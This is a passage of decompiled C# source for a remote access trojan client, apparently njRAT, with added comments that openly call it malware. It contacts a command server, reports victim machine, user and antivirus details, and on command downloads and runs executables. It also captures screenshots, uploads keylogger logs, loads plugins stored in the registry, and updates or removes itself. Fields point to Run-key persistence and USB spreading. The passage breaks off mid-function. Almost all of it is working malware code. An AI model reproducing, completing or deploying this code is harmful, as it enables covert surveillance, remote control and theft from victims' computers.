﻿// Decompiled with JetBrains decompiler
// Type: j.OK
// Assembly: Stub, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 292CE86C-33B7-4D1B-9DE2-B41CEB9702D8
// Assembly location: C:\Users\User\Desktop\Client.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using My;
using Stub;
using System;
using System.Collections;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

/**
 * @file OK.cs
 * @brief Core functionality for system operations, network communication,
 *        anti-analysis, persistence, and dynamic plugin loading.
 *
 * This file implements many routines essential to the malware’s behavior.
 * Below are rewritten excerpts with inline documentation for the key functions.
 */

#nullable disable
namespace j
{
  [StandardModule]
  internal sealed class OK
  {
            //==============================================================================
        // Static Fields: Configuration, state, and resources.
        //==============================================================================
    private static byte[] b = new byte[5121];
    public static bool BD = Conversions.ToBoolean("True");
    public static TcpClient C = (TcpClient) null;
    public static bool Cn = false;
    public static string DR = "AppData";
    public static string EXE = "WindowsServices.exe";
    public static Computer F = new Computer();
    public static FileStream FS;
    public static string H = "127.0.0.1";
    public static bool Idr = Conversions.ToBoolean("True");
    public static bool Anti_CH = Conversions.ToBoolean("True");
    public static bool IsF = Conversions.ToBoolean("True");
    public static bool USB_SP = Conversions.ToBoolean("True");
    public static bool Isu = Conversions.ToBoolean("True");
    public static kl kq = (kl) null;
    private static string lastcap = "";
    public static FileInfo LO = new FileInfo(Assembly.GetEntryAssembly().Location);
    private static MemoryStream MeM = new MemoryStream();
    public static object MT = (object) null;
    public static string P = "6522";
    public static object PLG = (object) null;
    public static string RG = "ca26bdee4b22e1b546f74c9817350376";
    public static string sf = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    public static string VN = "TXlCb3Q=";
    public static string VR = "0.7d";
    public static string Y = "Y262SUCZ4UJJ";
/**
 * @brief Retrieves the active window's title and encodes it in Base64.
 *
 * @return Base64 encoded title of the active window, or empty string if unavailable
 */
    public static string ACT()
    {
      string str1;
      try
      {
        IntPtr foregroundWindow = OK.GetForegroundWindow();
        if (foregroundWindow == IntPtr.Zero)
          return "";
        string str2 = Strings.Space(checked (OK.GetWindowTextLength(unchecked ((long) foregroundWindow)) + 1));
        OK.GetWindowText(foregroundWindow, ref str2, str2.Length);
        str1 = OK.ENB(ref str2);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        str1 = "";
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      return str1;
    }

/**
 * @brief Converts a byte array to a UTF-8 string
 * 
 * @param B Reference to the byte array to convert
 * @return UTF-8 string representation of the byte array
 */
    public static string BS(ref byte[] B) => Encoding.UTF8.GetString(B);
/**
 * @brief Checks if a camera is available on the system
 * 
 * @return true if at least one camera device is detected, false otherwise
 */
    public static bool Cam()
    {
      try
      {
        int num = 0;
        do
        {
          string str1 = (string) null;
          int wDriver = (int) checked ((short) num);
          string str2 = Strings.Space(100);
          ref string local1 = ref str2;
          ref string local2 = ref str1;
          if (OK.capGetDriverDescriptionA((short) wDriver, ref local1, 100, ref local2, 100))
            return true;
          checked { ++num; }
        }
        while (num <= 4);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      return false;
    }

    [DllImport("avicap32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    

/**
 * @brief Retrieves information about a camera driver
 * 
 * @param wDriver The index of the camera driver to query
 * @param lpszName Buffer to receive the driver name
 * @param cbName Size of the name buffer
 * @param lpszVer Buffer to receive the driver version
 * @param cbVer Size of the version buffer
 * @return true if successful, false otherwise
 */
    public static extern bool capGetDriverDescriptionA(
      short wDriver,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszName,
      int cbName,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszVer,
      int cbVer);
/**
 * @brief Compares the directories of two FileInfo objects
 * 
 * @param F1 First FileInfo object
 * @param F2 Second FileInfo object
 * @return true if both files are in the same directory tree, false otherwise
 */
    private static bool CompDir(FileInfo F1, FileInfo F2)
    {
      if (Operators.CompareString(F1.Name.ToLower(), F2.Name.ToLower(), false) != 0)
        return false;
      DirectoryInfo directoryInfo1 = F1.Directory;
      DirectoryInfo directoryInfo2 = F2.Directory;
      while (Operators.CompareString(directoryInfo1.Name.ToLower(), directoryInfo2.Name.ToLower(), false) == 0)
      {
        directoryInfo1 = directoryInfo1.Parent;
        directoryInfo2 = directoryInfo2.Parent;
        if (directoryInfo1 == null & directoryInfo2 == null)
          return true;
        if (directoryInfo1 == null || directoryInfo2 == null)
          return false;
      }
      return false;
    }
/**
 * @brief Establishes a connection to the remote server
 * 
 * @return true if connection was successfully established, false otherwise
 */
    public static bool connect()
    {
      OK.Cn = false;
      Thread.Sleep(2000);
      lock ((object) OK.LO)
      {
        try
        {
          if (OK.C != null)
          {
            try
            {
              OK.C.Close();
              OK.C = (TcpClient) null;
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
              ProjectData.ClearProjectError();
            }
          }
          try
          {
            OK.MeM.Dispose();
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
            ProjectData.ClearProjectError();
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
        try
        {
          OK.MeM = new MemoryStream();
          OK.C = new TcpClient();
          OK.C.ReceiveBufferSize = 204800;
          OK.C.SendBufferSize = 204800;
          OK.C.Client.SendTimeout = 10000;
          OK.C.Client.ReceiveTimeout = 10000;
          OK.C.Connect(OK.H, Conversions.ToInteger(OK.P));
          OK.Cn = true;
          OK.Send(OK.inf());
          try
          {
            string str1;
            string str2;
            if (Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(OK.GTV("vn", (object) "")), (object) "", false))
            {
              str2 = str1 + OK.DEB(ref OK.VN) + "\r\n";
            }
            else
            {
              string str3 = str1;
              string s = Conversions.ToString(RuntimeHelpers.GetObjectValue(OK.GTV("vn", (object) "")));
              string str4 = OK.DEB(ref s);
              str2 = str3 + str4 + "\r\n";
            }
            string s1 = str2 + OK.H + ":" + OK.P + "\r\n" + OK.DR + "\r\n" + OK.EXE + "\r\n" + Conversions.ToString(OK.Idr) + "\r\n" + Conversions.ToString(OK.IsF) + "\r\n" + Conversions.ToString(OK.Isu) + "\r\n" + Conversions.ToString(OK.BD);
            OK.Send("inf" + OK.Y + OK.ENB(ref s1));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
            ProjectData.ClearProjectError();
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          OK.Cn = false;
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
      return OK.Cn;
    }
/**
 * @brief Decodes a Base64 encoded string
 * 
 * @param s Reference to the Base64 encoded string
 * @return Decoded string
 */
    public static string DEB(ref string s)
    {
      byte[] B = Convert.FromBase64String(s);
      return OK.BS(ref B);
    }
/**
 * @brief Deletes a registry value from the current user's registry
 * 
 * @param n Name of the registry value to delete
 */
    public static void DLV(string n)
    {
      try
      {
        OK.F.Registry.CurrentUser.OpenSubKey("Software\\" + OK.RG, true).DeleteValue(n);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
    }
/**
 * @brief Calls the process manipulation method with parameter 0
 */
    public static void ED() => OK.pr(0);
/**
 * @brief Encodes a string in Base64
 * 
 * @param s Reference to the string to encode
 * @return Base64 encoded string
 */
    public static string ENB(ref string s) => Convert.ToBase64String(OK.SB(ref s));
/**
 * @brief Gets a handle to the currently active window
 * 
 * @return Handle to the foreground window
 */
    [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr GetForegroundWindow();
/**
 * @brief Retrieves information about the file system and volume
 * 
 * @param lpRootPathName Root path of the volume
 * @param lpVolumeNameBuffer Buffer to receive the volume name
 * @param nVolumeNameSize Size of the volume name buffer
 * @param lpVolumeSerialNumber Pointer to receive the volume serial number
 * @param lpMaximumComponentLength Pointer to receive the maximum component length
 * @param lpFileSystemFlags Pointer to receive the file system flags
 * @param lpFileSystemNameBuffer Buffer to receive the file system name
 * @param nFileSystemNameSize Size of the file system name buffer
 * @return Nonzero on success, zero on failure
 */
    [DllImport("kernel32", EntryPoint = "GetVolumeInformationA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetVolumeInformation(
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpRootPathName,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpVolumeNameBuffer,
      int nVolumeNameSize,
      ref int lpVolumeSerialNumber,
      ref int lpMaximumComponentLength,
      ref int lpFileSystemFlags,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpFileSystemNameBuffer,
      int nFileSystemNameSize);
/**
 * @brief Gets the text of the specified window
 * 
 * @param hWnd Handle to the window
 * @param WinTitle Buffer to receive the window text
 * @param MaxLength Maximum number of characters to copy
 * @return The number of characters copied
 */
    [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int GetWindowText(IntPtr hWnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string WinTitle, int MaxLength);

/**
 * @brief Retrieves the name of the installed antivirus product
 * 
 * @return Name of the antivirus product, or "No AV" if none found
 */
    public static string GetAntiVirus()
    {
      string antiVirus;
      int num1;
      try
      {
label_2:
        int num2 = 1;
        object obj = (object) "Select * From AntiVirusProduct";
label_3:
        num2 = 2;
        object objectValue1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Interaction.GetObject("winmgmts:\\\\.\\root\\SecurityCenter2")));
label_4:
        num2 = 3;
        object[] Arguments = new object[1]
        {
          RuntimeHelpers.GetObjectValue(obj)
        };
        bool[] CopyBack = new bool[1]{ true };
        if (CopyBack[0])
          obj = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Arguments[0]));
        object objectValue2 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue1), (System.Type) null, "ExecQuery", Arguments, (string[]) null, (System.Type[]) null, CopyBack)));
label_7:
        num2 = 4;
        IEnumerator enumerator = ((IEnumerable) objectValue2).GetEnumerator();
        goto label_12;
label_9:
        int num3 = 1;
label_10:
        num2 = 6;
        object objectValue3;
        antiVirus = NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue3), (System.Type) null, "displayName", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null).ToString();
        goto label_22;
label_12:
        if (enumerator.MoveNext())
        {
          objectValue3 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(enumerator.Current));
          goto label_9;
        }
        else if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
label_16:
        num2 = 8;
        antiVirus = "No AV";
        goto label_22;
label_18:
        num1 = num2;
        if (num3 != 0)
        {
          if (num3 == 1)
          {
            num1 = 0;
            switch (checked (num1 + 1))
            {
              case 1:
                goto label_2;
              case 2:
                goto label_3;
              case 3:
                goto label_4;
              case 4:
                goto label_7;
              case 5:
                goto label_9;
              case 6:
                goto label_10;
              case 7:
                num2 = 7;
                goto label_12;
              case 8:
                goto label_16;
              case 9:
                goto label_22;
            }
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        goto label_18;
      }
label_22:
      if (num1 == 0)
        ;
      return antiVirus;
    }

    [DllImport("user32.dll", EntryPoint = "GetWindowTextLengthA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int GetWindowTextLength(long hwnd);
/**
 * @brief Gets a value from the registry or returns the default if not found
 * 
 * @param n Registry value name
 * @param ret Default value to return if the registry value is not found
 * @return Registry value or default value
 */
    public static object GTV(string n, object ret)
    {
      object objectValue;
      try
      {
        objectValue = RuntimeHelpers.GetObjectValue(OK.F.Registry.CurrentUser.OpenSubKey("Software\\" + OK.RG).GetValue(n, RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(ret))));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        objectValue = RuntimeHelpers.GetObjectValue(ret);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      return objectValue;
    }
/**
 * @brief Gets the hardware ID (volume serial number)
 * 
 * @return Volume serial number as a hex string, or "ERR" on failure
 */
    public static string HWD()
    {
      string str;
      try
      {
        string lpVolumeNameBuffer = (string) null;
        int lpMaximumComponentLength = 0;
        int lpFileSystemFlags = 0;
        string lpFileSystemNameBuffer = (string) null;
        string lpRootPathName = Interaction.Environ("SystemDrive") + "\\";
        int lpVolumeSerialNumber;
        OK.GetVolumeInformation(ref lpRootPathName, ref lpVolumeNameBuffer, 0, ref lpVolumeSerialNumber, ref lpMaximumComponentLength, ref lpFileSystemFlags, ref lpFileSystemNameBuffer, 0);
        str = Conversion.Hex(lpVolumeSerialNumber);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        str = "ERR";
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      return str;
    }
/**
 * @brief Handles incoming data from the remote server
 * 
 * @param b Byte array containing the received data
 */
    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public static void Ind(byte[] b)
    {
      string[] strArray1 = Strings.Split(OK.BS(ref b), OK.Y);
      try
      {
        string Left1 = strArray1[0];
        if (Operators.CompareString(Left1, "ll", false) != 0)
        {
          if (Operators.CompareString(Left1, "kl", false) != 0)
          {
            if (Operators.CompareString(Left1, "prof", false) == 0)
            {
              string Left2 = strArray1[1];
              if (Operators.CompareString(Left2, "~", false) != 0)
              {
                if (Operators.CompareString(Left2, "!", false) != 0)
                {
                  if (Operators.CompareString(Left2, "@", false) != 0)
                    return;
                  OK.DLV(strArray1[2]);
                }
                else
                {
                  OK.STV(strArray1[2], (object) strArray1[3], RegistryValueKind.String);
                  OK.Send(Conversions.ToString(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject((object) ("getvalue" + OK.Y + strArray1[1] + OK.Y), RuntimeHelpers.GetObjectValue(OK.GTV(strArray1[1], (object) ""))))));
                }
              }
              else
                OK.STV(strArray1[2], (object) strArray1[3], RegistryValueKind.String);
            }
            else if (Operators.CompareString(Left1, "rn", false) == 0)
            {
              byte[] bytes;
              if (strArray1[2][0] == '\u001F')
              {
                try
                {
                  MemoryStream memoryStream = new MemoryStream();
                  int length = (strArray1[0] + OK.Y + strArray1[1] + OK.Y).Length;
                  memoryStream.Write(b, length, checked (b.Length - length));
                  bytes = OK.ZIP(memoryStream.ToArray());
                }
                catch (Exception ex)
                {
                  ProjectData.SetProjectError(ex);
                  ProjectData.SetProjectError(ex);
                  OK.Send("MSG" + OK.Y + "Execute ERROR");
                  OK.Send("bla");
                  ProjectData.ClearProjectError();
                  ProjectData.ClearProjectError();
                  return;
                }
              }
              else
              {
                WebClient webClient = new WebClient();
                try
                {
                  bytes = webClient.DownloadData(strArray1[2]);
                }
                catch (Exception ex)
                {
                  ProjectData.SetProjectError(ex);
                  ProjectData.SetProjectError(ex);
                  OK.Send("MSG" + OK.Y + "Download ERROR");
                  OK.Send("bla");
                  ProjectData.ClearProjectError();
                  ProjectData.ClearProjectError();
                  return;
                }
              }
              OK.Send("bla");
              string str = Path.GetTempFileName() + "." + strArray1[1];
              try
              {
                System.IO.File.WriteAllBytes(str, bytes);
                Process.Start(str);
                OK.Send("MSG" + OK.Y + "Executed As " + new FileInfo(str).Name);
              }
              catch (Exception ex1)
              {
                ProjectData.SetProjectError(ex1);
                Exception ex2 = ex1;
                ProjectData.SetProjectError(ex2);
                Exception exception = ex2;
                OK.Send("MSG" + OK.Y + "Execute ERROR " + exception.Message);
                ProjectData.ClearProjectError();
                ProjectData.ClearProjectError();
              }
            }
            else if (Operators.CompareString(Left1, "inv", false) != 0)
            {
              if (Operators.CompareString(Left1, "ret", false) != 0)
              {
                if (Operators.CompareString(Left1, "CAP", false) != 0)
                {
                  if (Operators.CompareString(Left1, "un", false) == 0)
                  {
                    string Left3 = strArray1[1];
                    if (Operators.CompareString(Left3, "~", false) != 0)
                    {
                      if (Operators.CompareString(Left3, "!", false) != 0)
                      {
                        if (Operators.CompareString(Left3, "@", false) != 0)
                          return;
                        OK.pr(0);
                        Process.Start(OK.LO.FullName);
                        ProjectData.EndApp();
                      }
                      else
                      {
                        OK.pr(0);
                        ProjectData.EndApp();
                      }
                    }
                    else
                      OK.UNS();
                  }
                  else if (Operators.CompareString(Left1, "up", false) == 0)
                  {
                    byte[] bytes;
                    if (strArray1[1][0] == '\u001F')
                    {
                      try
                      {
                        MemoryStream memoryStream = new MemoryStream();
                        int length = (strArray1[0] + OK.Y).Length;
                        memoryStream.Write(b, length, checked (b.Length - length));
                        bytes = OK.ZIP(memoryStream.ToArray());
                      }
                      catch (Exception ex)
                      {
                        ProjectData.SetProjectError(ex);
                        ProjectData.SetProjectError(ex);
                        OK.Send("MSG" + OK.Y + "Update ERROR");
                        OK.Send("bla");
                        ProjectData.ClearProjectError();
                        ProjectData.ClearProjectError();
                        return;
                      }
                    }
                    else
                    {
                      WebClient webClient = new WebClient();
                      try
                      {
                        bytes = webClient.DownloadData(strArray1[1]);
                      }
                      catch (Exception ex)
                      {
                        ProjectData.SetProjectError(ex);
                        ProjectData.SetProjectError(ex);
                        OK.Send("MSG" + OK.Y + "Update ERROR");
                        OK.Send("bla");
                        ProjectData.ClearProjectError();
                        ProjectData.ClearProjectError();
                        return;
                      }
                    }
                    OK.Send("bla");
                    string str = Path.GetTempFileName() + ".exe";
                    try
                    {
                      OK.Send("MSG" + OK.Y + "Updating To " + new FileInfo(str).Name);
                      Thread.Sleep(2000);
                      System.IO.File.WriteAllBytes(str, bytes);
                      Process.Start(str, "..");
                    }
                    catch (Exception ex3)
                    {
                      ProjectData.SetProjectError(ex3);
                      Exception ex4 = ex3;
                      ProjectData.SetProjectError(ex4);
                      Exception exception = ex4;
                      OK.Send("MSG" + OK.Y + "Update ERROR " + exception.Message);
                      ProjectData.ClearProjectError();
                      ProjectData.ClearProjectError();
                      return;
                    }
                    OK.UNS();
                  }
                  else if (Operators.CompareString(Left1, "Ex", false) == 0)
                  {
                    if (OK.PLG == null)
                    {
                      OK.Send("PLG");
                      int num = 0;
                      while (!(OK.PLG != null | num == 20 | !OK.Cn))
                      {
                        checked { ++num; }
                        Thread.Sleep(1000);
                      }
                      if (OK.PLG == null | !OK.Cn)
                        return;
                    }
                    object[] Arguments = new object[1]
                    {
                      (object) b
                    };
                    bool[] CopyBack = new bool[1]{ true };
                    NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(OK.PLG), (System.Type) null, "ind", Arguments, (string[]) null, (System.Type[]) null, CopyBack, true);
                    if (CopyBack[0])
                      b = (byte[]) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Arguments[0])), typeof (byte[]));
                  }
                  else if (Operators.CompareString(Left1, "PLG", false) == 0)
                  {
                    MemoryStream memoryStream = new MemoryStream();
                    int length = (strArray1[0] + OK.Y).Length;
                    memoryStream.Write(b, length, checked (b.Length - length));
                    OK.PLG = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(OK.Plugin(OK.ZIP(memoryStream.ToArray()), "A")));
                    NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(OK.PLG), (System.Type) null, "H", new object[1]
                    {
                      (object) OK.H
                    }, (string[]) null, (System.Type[]) null);
                    NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(OK.PLG), (System.Type) null, "P", new object[1]
                    {
                      (object) OK.P
                    }, (string[]) null, (System.Type[]) null);
                    NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(OK.PLG), (System.Type) null, "c", new object[1]
                    {
                      (object) OK.C
                    }, (string[]) null, (System.Type[]) null);
                  }
                }
                else
                {
                  Bitmap bitmap1 = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format16bppRgb555);
                  Graphics g = Graphics.FromImage((Image) bitmap1);
                  Size blockRegionSize = new Size(bitmap1.Width, bitmap1.Height);
                  g.CopyFromScreen(0, 0, 0, 0, blockRegionSize, CopyPixelOperation.SourceCopy);
                  try
                  {
                    Rectangle targetRect = new Rectangle(Cursor.Position, new Size(32, 32));
                    Cursors.Default.Draw(g, targetRect);
                  }
                  catch (Exception ex)
                  {
                    ProjectData.SetProjectError(ex);
                    ProjectData.SetProjectError(ex);
                    ProjectData.ClearProjectError();
                    ProjectData.ClearProjectError();
                  }
                  g.Dispose();
                  Bitmap bitmap2 = new Bitmap(Conversions.ToInteger(strArray1[1]), Conversions.ToInteger(strArray1[2]));
                  Graphics graphics = Graphics.FromImage((Image) bitmap2);
                  graphics.DrawImage((Image) bitmap1, 0, 0, bitmap2.Width, bitmap2.Height);
                  graphics.Dispose();
                  MemoryStream memoryStream1 = new MemoryStream();
                  string S = "CAP" + OK.Y;
                  b = OK.SB(ref S);
                  memoryStream1.Write(b, 0, b.Length);
                  MemoryStream memoryStream2 = new MemoryStream();
                  bitmap2.Save((Stream) memoryStream2, ImageFormat.Jpeg);
                  string Left4 = OK.md5(memoryStream2.ToArray());
                  if (Operators.CompareString(Left4, OK.lastcap, false) != 0)
                  {
                    OK.lastcap = Left4;
                    memoryStream1.Write(memoryStream2.ToArray(), 0, checked ((int) memoryStream2.Length));
                  }
                  else
                    memoryStream1.WriteByte((byte) 0);
                  OK.Sendb(memoryStream1.ToArray());
                  memoryStream1.Dispose();
                  memoryStream2.Dispose();
                  bitmap1.Dispose();
                  bitmap2.Dispose();
                }
              }
              else
              {
                byte[] numArray = (byte[]) OK.GTV(strArray1[1], (object) new byte[0]);
                if (strArray1[2].Length < 10 & numArray.Length == 0)
                {
                  OK.Send("pl" + OK.Y + strArray1[1] + OK.Y + Conversions.ToString(1));
                }
                else
                {
                  if (strArray1[2].Length > 10)
                  {
                    MemoryStream memoryStream = new MemoryStream();
                    int length = (strArray1[0] + OK.Y + strArray1[1] + OK.Y).Length;
                    memoryStream.Write(b, length, checked (b.Length - length));
                    numArray = OK.ZIP(memoryStream.ToArray());
                    OK.STV(strArray1[1], (object) numArray, RegistryValueKind.Binary);
                  }
                  OK.Send("pl" + OK.Y + strArray1[1] + OK.Y + Conversions.ToString(0));
                  object objectValue = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(OK.Plugin(numArray, "A")));
                  string[] strArray2 = new string[5]
                  {
                    "ret",
                    OK.Y,
                    strArray1[1],
                    OK.Y,
                    null
                  };
                  string s = Conversions.ToString(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue), (System.Type) null, "GT", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null)));
                  strArray2[4] = OK.ENB(ref s);
                  OK.Send(string.Concat(strArray2));
                }
              }
            }
            else
            {
              byte[] numArray = (byte[]) OK.GTV(strArray1[1], (object) new byte[0]);
              if (strArray1[3].Length < 10 & numArray.Length == 0)
              {
                OK.Send("pl" + OK.Y + strArray1[1] + OK.Y + Conversions.ToString(1));
              }
              else
              {
                if (strArray1[3].Length > 10)
                {
                  MemoryStream memoryStream = new MemoryStream();
                  int length = (strArray1[0] + OK.Y + strArray1[1] + OK.Y + strArray1[2] + OK.Y).Length;
                  memoryStream.Write(b, length, checked (b.Length - length));
                  numArray = OK.ZIP(memoryStream.ToArray());
                  OK.STV(strArray1[1], (object) numArray, RegistryValueKind.Binary);
                }
                OK.Send("pl" + OK.Y + strArray1[1] + OK.Y + Conversions.ToString(0));
                object objectValue = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(OK.Plugin(numArray, "A")));
                NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue), (System.Type) null, "h", new object[1]
                {
                  (object) OK.H
                }, (string[]) null, (System.Type[]) null);
                NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue), (System.Type) null, "p", new object[1]
                {
                  (object) OK.P
                }, (string[]) null, (System.Type[]) null);
                NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue), (System.Type) null, "osk", new object[1]
                {
                  (object) strArray1[2]
                }, (string[]) null, (System.Type[]) null);
                NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(objectValue), (System.Type) null, "start", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
                while (!Conversions.ToBoolean(RuntimeHelpers.GetObjectValue(Operators.OrObject((object) !OK.Cn, RuntimeHelpers.GetObjectValue(Operators.CompareObjectEqual(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue), (System.Type) null, "Off", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null)), (object) true, false))))))
                  Thread.Sleep(1);
                NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue), (System.Type) null, "off", new object[1]
                {
                  (object) true
                }, (string[]) null, (System.Type[]) null);
              }
            }
          }
          else
            OK.Send("kl" + OK.Y + OK.ENB(ref OK.kq.Logs));
        }
        else
          OK.Cn = false;
      }
      catch (Exception ex5)
      {
        ProjectData.SetProjectError(ex5);
        Exception ex6 = ex5;
        ProjectData.SetProjectError(ex6);
        Exception exception = ex6;
        if (strArray1.Length > 0 && Operators.CompareString(strArray1[0], "Ex", false) == 0 | Operators.CompareString(strArray1[0], "PLG", false) == 0)
          OK.PLG = (object) null;
        try
        {
          OK.Send("ER" + OK.Y + strArray1[0] + OK.Y + exception.Message);
        }
        catch (Exception ex7)
        {
          ProjectData.SetProjectError(ex7);
          ProjectData.SetProjectError(ex7);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
    }

/**
 * @brief Builds system information data to be sent to the server
 * 
 * @return Formatted string containing system information
 */
    public static string inf()
    {
      string str1 = "ll" + OK.Y;
      string str2;
      try
      {
        if (Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(OK.GTV("vn", (object) "")), (object) "", false))
        {
          string str3 = str1;
          string s = OK.DEB(ref OK.VN) + "_" + OK.HWD();
          string str4 = OK.ENB(ref s);
          string y = OK.Y;
          str2 = str3 + str4 + y;
        }
        else
        {
          string str5 = str1;
          string s1 = Conversions.ToString(RuntimeHelpers.GetObjectValue(OK.GTV("vn", (object) "")));
          string s2 = OK.DEB(ref s1) + "_" + OK.HWD();
          string str6 = OK.ENB(ref s2);
          string y = OK.Y;
          str2 = str5 + str6 + y;
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        string str7 = str1;
        string s = OK.HWD();
        string str8 = OK.ENB(ref s);
        string y = OK.Y;
        str2 = str7 + str8 + y;
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      string str9;
      try
      {
        str9 = str2 + Environment.MachineName + OK.Y;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        str9 = str2 + "??" + OK.Y;
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      string str10;
      try
      {
        str10 = str9 + Environment.UserName + OK.Y;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        str10 = str9 + "??" + OK.Y;
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      string str11;
      try
      {
        string str12 = str10;
        DateTime dateTime = OK.LO.LastWriteTime;
        dateTime = dateTime.Date;
        string str13 = dateTime.ToString("yy-MM-dd");
        string y = OK.Y;
        str11 = str12 + str13 + y;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        str11 = str10 + "??-??-??" + OK.Y;
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      string str14 = str11 + OK.Y;
      string str15;
      try
      {
        str15 = str14 + OK.F.Info.OSFullName.Replace("Microsoft", "").Replace("Windows", "Win").Replace("®", "").Replace("™", "").Replace("  ", " ").Replace(" Win", "Win");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        str15 = str14 + "??";
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      string str16 = str15 + "SP";
      string str17;
      try
      {
        string[] strArray = Strings.Split(Environment.OSVersion.ServicePack);
        if (strArray.Length == 1)
          str16 += "0";
        str17 = str16 + strArray[checked (strArray.Length - 1)];
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        str17 = str16 + "0";
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
